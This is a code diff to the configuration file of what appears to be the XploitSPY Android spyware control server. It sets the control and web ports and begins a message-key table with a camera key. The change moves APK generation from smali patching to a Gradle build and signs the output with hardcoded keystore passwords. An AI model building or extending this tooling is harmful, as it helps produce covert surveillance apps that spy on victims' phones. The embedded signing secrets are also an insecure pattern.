@@ -5,25 +5,26 @@ exports.debug = false;
 exports.web_port = 80;
 exports.control_port = 22222;
 
-// Paths
-exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
-exports.apkOutputPath = path.join(__dirname, '../assets/webpublic')
-exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/XploitSPY.apk')
+// Paths - 新的Gradle构建流程
+exports.clientPath = path.join(__dirname, '../../client');
+exports.configFilePath = path.join(__dirname, '../../client/app/src/main/java/com/remote/app/Config.java');
+exports.apkOutputPath = path.join(__dirname, '../assets/webpublic');
+exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/XploitSPY.apk');
+exports.apkUnsignedPath = path.join(__dirname, '../../client/app/build/outputs/apk/release/app-release-unsigned.apk');
 
 exports.downloadsFolder = '/client_downloads'
 exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
 
-exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
-exports.apkSign = path.join(__dirname, '../app/factory/', 'uber-apk-signer-1.1.0.jar');
-exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
+// 签名配置
 exports.certPath = path.join(__dirname, '../app/factory/release.jks');
-//exports.certPk8Path = path.join(__dirname, '../app/factory/testkey.pk8');
-// exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/remote/app/IOSocket.smali');
-exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/remote/app/h.smali');
+exports.apkSign = path.join(__dirname, '../app/factory/', 'uber-apk-signer-1.1.0.jar');
 
-exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
-//exports.signCommand = 'java -jar "' + exports.apkSign + '"  "' + exports.certPemPath + '"  "' + exports.certPk8Path + '"  "' + exports.apkBuildPath + '"  "' + exports.apkOutputPath + '"'; // <-- fix output
-exports.signCommand = 'java -jar "' + exports.apkSign + '" -a  "' + exports.apkBuildPath + '" --ks "' + exports.certPath + '"  --ksAlias key0 --ksPass release101 --ksKeyPass release101 --out  "' + exports.apkOutputPath + '"'; // <-- fix output
+// Gradle构建命令 (Windows/Linux兼容)
+const isWindows = process.platform === 'win32';
+const gradleCmd = isWindows ? 'gradlew.bat' : './gradlew';
+exports.gradlePath = path.join(exports.clientPath, gradleCmd);
+exports.buildCommand = `${exports.gradlePath} assembleRelease`;
+exports.signCommand = `java -jar "${exports.apkSign}" -a "${exports.apkUnsignedPath}" --ks "${exports.certPath}" --ksAlias key0 --ksPass release101 --ksKeyPass release101 --out "${exports.apkOutputPath}"`;
 
 exports.messageKeys = {
     camera: '0xCA',
